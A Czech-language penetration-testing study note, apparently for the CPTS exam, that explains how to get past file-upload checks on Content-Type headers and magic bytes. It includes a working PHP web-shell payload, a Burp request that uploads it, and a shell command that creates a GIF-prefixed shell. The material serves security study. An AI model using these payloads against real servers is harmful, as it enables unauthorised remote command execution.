Validace obsahu souboru na backendu ověřuje buď HTTP hlavičku `Content-Type`, nebo přímo strukturu bajtů v hlavičce souboru (**Magic Bytes / MIME-Type**). Obě kontroly lze obvykle snadno obejít úpravou požadavku nebo úpravou prvních bajtů payloadu.

**Přehled metod validace typu souboru a jejich obcházení**

|**Metoda validace**|**Zdroj kontroly na serveru**|**Technika obcházení**|**Příklad payloadu / úpravy**|
|---|---|---|---|
|**Content-Type Header**|Proměnná `$_FILES['file']['type']` (přebírá se z HTTP požadavku)|Úprava hlavičky požadavku v proxy (Burp Suite) na povolenou hodnotu|`Content-Type: image/jpeg`|
|**MIME-Type (Magic Bytes)**|Funkce typu `mime_content_type()` (kontroluje prvních pár bajtů souboru)|Vložení Magic Bytes obrázku na začátek PHP webshellu|`GIF8<?php system($_GET["cmd"]); ?>`|

### 1. Obcházení validace Content-Type Header

Hlavičku `Content-Type` nastavuje prohlížeč na základě přípon souboru na klientovi. Jelikož jde o klientský údaj předávaný v HTTP požadavku, server mu nemůže důvěřovat.

- **Postup:**
    
    1. Zachyťte požadavek na nahrání PHP souboru v Burp Suite.
        
    2. V těle požadavku vyhledejte sekci příslušející nahrávanému souboru.
        
    3. Změňte původní `Content-Type: application/x-php` na povolený typ (např. `image/jpeg` nebo `image/png`).
        

HTTP

```
POST /upload.php HTTP/1.1
...
Content-Disposition: form-data; name="uploadFile"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET["cmd"]); ?>
```

> 💡 **Poznámka:** Všímejte si rozdílu mezi hlavní hlavičkou `Content-Type` celého HTTP požadavku (nahoře) a hlavičkou `Content-Type` konkrétní přílohy v multipart formuláři (dole). Změnit musíte hlavičku příslušnou nahrávanému souboru.

### 2. Obcházení validace MIME-Type (Magic Bytes)

Při kontrole MIME typu prověřuje backend první bajty souboru (**File Signature / Magic Bytes**). Příkaz `file` v Linuxu nebo PHP funkce `mime_content_type()` určují typ podle této hlavičky bez ohledu na příponu.

Nejsnadnější je napodobit formát **GIF**, protože jeho Magic Bytes tvoří čitelné ASCII znaky (`GIF87a`, `GIF89a` nebo zkráceně `GIF8`).

- **Příklad vytvoření podvrženého souboru:**
    
    Bash
    
    ```
    echo "GIF8<?php system(\$_GET['cmd']); ?>" > shell.php
    ```
    
- **Ověření typu souboru v terminálu:**
    
    Bash
    
    ```
    file shell.php
    # Výstup: shell.php: GIF image data
    ```
    

Po nahrání takového souboru backend vyhodnotí soubor jako obrázek GIF a schválí jeho uložení. Při jeho načtení přes webový prohlížeč se nejprve vytiskne text `GIF8` a následně PHP interpret vykoná vložený systémový kód.

### 💡 Tipy pro zkoušku CPTS

- **Kombinování technik (Chained Bypasses):** V reálném prostředí i na zkoušce se často setkáte s kombinací více filtrů. Úspěšný payload obvykle vyžaduje spojení tří prvků:
    
    1. Obcházení přípony (`.phtml`, `.jpg.php` nebo `shell.php`).
        
    2. Falešnou hlavičku `Content-Type: image/png`.
        
    3. První bajty `GIF8` na začátku kódu.